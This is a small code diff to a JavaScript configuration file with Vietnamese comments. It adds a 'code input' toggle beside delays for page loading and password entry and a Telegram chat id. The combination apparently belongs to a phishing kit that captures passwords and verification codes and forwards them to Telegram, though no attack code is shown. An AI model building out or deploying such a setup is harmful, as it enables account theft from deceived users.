@@ -10,6 +10,8 @@ const config = {
 		page_loading_time: 5000,
 		// Thời gian loading khi nhập mật khẩu(milisecond)
 		password_loading_time: 15000,
+		// Bật tắt nhập code
+		code_input_enabled: true,
 	},
 	telegram: {
 		chatid: '6759061293',
